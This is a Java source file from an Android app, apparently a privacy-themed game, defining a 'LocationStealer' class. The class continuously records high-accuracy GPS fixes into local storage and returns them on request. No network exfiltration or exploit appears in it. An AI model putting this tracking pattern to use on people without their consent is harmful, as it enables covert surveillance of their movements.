package de.hpi3d.gamepgrog.trap.android;

import android.app.Activity;
import android.app.Application;
import android.content.Context;
import android.location.Location;
import android.location.LocationManager;
import android.os.Looper;
import android.util.Log;
import android.widget.Toast;

import com.google.android.gms.location.FusedLocationProviderClient;
import com.google.android.gms.location.LocationCallback;
import com.google.android.gms.location.LocationRequest;
import com.google.android.gms.location.LocationResult;

import java.util.Collections;
import java.util.List;

import de.hpi3d.gamepgrog.trap.R;
import de.hpi3d.gamepgrog.trap.api.StorageManager;
import de.hpi3d.gamepgrog.trap.datatypes.LocationData;
import de.hpi3d.gamepgrog.trap.future.ArrayExt;
import de.hpi3d.gamepgrog.trap.future.Consumer;
import de.hpi3d.gamepgrog.trap.future.Function;

/**
 * Stealer responsible for location data.
 * <p>
 * More complicated than most other stealers, since location is time dependent, and
 * not necessarily accessible after the fact.
 * More importantly, we're not dealing with android directly, instead with google libraries,
 * which add additional hurdles, since they work asynchronously.
 */
public class LocationStealer {

    private static final int MAX_INTERVAL = 10 * 1000;
    private static final int FAST_INTERVAL = 1000;
    private static final int CURRENT_INTERVAL = 100;

    private static boolean currentlyStealing = false;

    /**
     * Activates the stealer if it isn't already active.
     * Once the stealer is active it starts remembering locations in our StorageManager, which it
     * can return when requested.
     *
     * @param applicationAsContext to access device
     */
    public static void startStealing(Application applicationAsContext) {
        if (currentlyStealing) {
            return;
        }

        currentlyStealing = true;
        StorageManager.with(applicationAsContext).locations.reset();

        requestLocations(applicationAsContext, MAX_INTERVAL, FAST_INTERVAL, locationData -> {
            StorageManager.with(applicationAsContext).locations.add(locationData);
            return true;
        });
        Log.d("LocationStealer", "Started stealing locations");
    }


    /**
     * Stops the current stealer and returns all data that was collected.
     *
     * @param c
     * @return
     */
    public static List<LocationData> getStealResult(Activity c) {
        currentlyStealing = false;
        List<LocationData> data = StorageManager.with(c).locations.get();
        // Don't reset
        // StorageManager.with(c).locations.reset();
        return data;
    }

    /**
     * Generates a single location, the one that the user has at this very moment.
     * Since the calls to googles libraries are asynchronous we don't return the location.
     * Instead it is given to the method given to us as a consumer
     *
     * @param context  to access storage
     * @param consumer method to act upon the location
     */
    public static void takeSingleLocationData(Context context, Consumer<List<LocationData>> consumer) {
        if (!isGpsEnabled(context)) {
            Toast.makeText(context, R.string.gps_not_enabled, Toast.LENGTH_SHORT).show();
            consumer.accept(Collections.emptyList());
            return;
        }
        requestLocations(context, CURRENT_INTERVAL, CURRENT_INTERVAL, (location) -> {
            consumer.accept(ArrayExt.toArrayList(location));
            return false;
        });
    }

    /**
     * Starts a longer running tracking of location. All locations returned to this method
     * are given to the callback, which can process further.
     *
     * @param context      to access storage
     * @param maxInterval  maximum time difference between two location data points
     * @param fastInterval minimal time difference between two location data points
     * @param callback     method to furher process data
     */
    private static void requestLocations(Context context, int maxInterval, int fastInterval,
                                         Function<LocationData, Boolean> callback) {
        FusedLocationProviderClient client = new FusedLocationProviderClient(context);
        LocationRequest locationRequest = LocationRequest.create();
        locationRequest.setInterval(maxInterval);
        locationRequest.setFastestInterval(fastInterval);
        locationRequest.setPriority(LocationRequest.PRIORITY_HIGH_ACCURACY);

        LocationCallback locationCallback = new LocationCallback() {
            private boolean running = true;

            @Override
            public void onLocationResult(LocationResult locationResult) {
                if (locationResult == null || !running) {
                    return;
                }
                Location last = locationResult.getLastLocation();
                if (last != null) {
                    running = callback.apply(new LocationData(last));

                    if (!running)
                        client.removeLocationUpdates(this);
                }
            }
        };

        client.requestLocationUpdates(locationRequest,
                locationCallback,
                Looper.getMainLooper());
    }

    /**
     * Returns whether GPS is currently enabled
     *
     * @param context to access storage
     * @return current state of gps
     */
    public static boolean isGpsEnabled(Context context) {
        LocationManager manager = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
        if (manager == null)
            throw new IllegalArgumentException("Cannot get Manager");
        return manager.isProviderEnabled(LocationManager.GPS_PROVIDER);
    }
}
